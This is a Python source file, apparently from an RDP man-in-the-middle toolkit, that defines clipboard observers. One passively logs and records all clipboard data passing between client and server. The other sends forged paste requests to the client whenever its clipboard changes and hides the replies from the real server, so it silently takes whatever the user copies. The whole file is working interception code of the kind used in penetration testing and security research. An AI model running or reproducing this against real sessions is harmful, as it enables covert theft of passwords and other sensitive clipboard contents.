import logging
from binascii import hexlify

from rdpy.core.observer import Observer
from rdpy.enum.core import ParserMode
from rdpy.enum.rdp import RDPPlayerMessageType
from rdpy.enum.virtual_channel.clipboard import ClipboardMessageType, ClipboardFormat
from rdpy.layer.layer import Layer
from rdpy.parser.rdp.virtual_channel.clipboard import ClipboardParser
from rdpy.pdu.rdp.virtual_channel.clipboard import FormatDataResponsePDU, FormatDataRequestPDU, ClipboardPDU
from rdpy.recording.recorder import Recorder


class PassiveClipboardChannelObserver(Observer):
    """
    MITM observer that passively intercept clipboard data from the Clipboard virtual channel as they
    get transferred.
    """

    def __init__(self, layer: Layer, recorder: Recorder, mode: ParserMode, **kwargs):
        """
        :type layer: rdpy.core.layer.Layer
        :type recorder: rdpy.recording.recorder.Recorder
        :type mode: rdpy.enum.core.ParserMode
        """
        Observer.__init__(self, **kwargs)

        self.clipboardParser = ClipboardParser()
        self.peer = None
        self.layer = layer
        self.recorder = recorder
        self.forwardNextDataResponse = True
        self.mitm_log = logging.getLogger("mitm.clipboard.{}"
                                          .format("client" if mode == ParserMode.CLIENT else "server"))
        self.mitm_clipboard_log = logging.getLogger(self.mitm_log.name + ".data")

    def onPDUReceived(self, pdu: ClipboardPDU):
        """
        Called when a PDU on the observed layer is received.
        :param pdu: the PDU that was received.
        :type pdu: rdpy.pdu.rdp.virtual_channel.clipboard.ClipboardPDU
        """

        self.mitm_log.debug("PDU received: {}".format(str(pdu.msgType)))

        if self.peer:
            self.peer.sendPDU(pdu)

    def sendPDU(self, pdu: ClipboardPDU):
        """
        Log and record every FormatDataResponsePDU (clipboard data).
        Transfer only the FormatDataResponsePDU if it didn't originate from the Active clipboard stealer.
        For the other PDUs, just transfer it.
        """
        if not isinstance(pdu, FormatDataResponsePDU):
            self.layer.send(self.clipboardParser.write(pdu))
        else:
            if self.forwardNextDataResponse:
                self.layer.send(self.clipboardParser.write(pdu))
            if isinstance(pdu, FormatDataResponsePDU):
                self.mitm_clipboard_log.info("%(clipboardData)s", {"clipboardData": hexlify(pdu.requestedFormatData).decode()})
                self.recorder.record(pdu, RDPPlayerMessageType.CLIPBOARD_DATA)
                self.forwardNextDataResponse = True


class ActiveClipboardChannelObserver(PassiveClipboardChannelObserver):
    """
    Observer that actively sends fake paste requests when its client sends a clipboard changed (FORMAT_LIST_RESPONSE)
    packet.
    """

    def __init__(self, layer, recorder, mode: ParserMode, **kwargs):
        PassiveClipboardChannelObserver.__init__(self, layer, recorder, mode, **kwargs)

    def onPDUReceived(self, pdu: ClipboardPDU):
        """
        If a format list response is received, send a request to the client for the clipboard data.
        Make sure that the response to this request is NOT transferred to the server, as it can make
        the connection crash.
        For every other messages, just transfer the message normally.
        """
        PassiveClipboardChannelObserver.onPDUReceived(self, pdu)
        if pdu.msgType == ClipboardMessageType.CB_FORMAT_LIST_RESPONSE:
            self.sendPasteRequest()

    def sendPasteRequest(self):
        """
        Send a FormatDataRequest to the client to request the clipboard data.
        Sets a flag is the MITMServerClipboardObserver to make sure that this request
        is not transferred to the actual server.
        """
        formatDataRequestPDU = FormatDataRequestPDU(ClipboardFormat.GENERIC)
        self.peer.sendPDU(formatDataRequestPDU)
        self.forwardNextDataResponse = False
